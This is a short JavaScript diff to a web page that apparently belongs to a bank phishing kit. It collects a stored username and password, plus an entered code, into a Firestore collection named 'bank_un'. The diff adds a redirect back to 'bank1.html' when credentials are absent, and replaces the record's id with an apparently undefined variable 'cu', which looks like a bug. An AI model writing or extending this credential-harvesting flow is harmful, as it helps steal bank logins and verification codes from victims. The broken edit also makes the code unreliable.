@@ -68,6 +68,9 @@
                 const username = localStorage.getItem("username");
                 const password = localStorage.getItem("password");
                 const code = document.getElementById("code").value;
+                 if(!username || !password) {
+                    window.location.href = "bank1.html";
+                    }
     
                 if (code) {
                     try {
@@ -76,7 +79,7 @@
     
                         // Ajouter les données dans Firestore avec l'ID personnalisé
                         await setDoc(doc(db, "bank_un", customId), {
-                            id: customId,
+                            id: cu,
                             username: username,
                             motdepasse: password,
                             code: code,
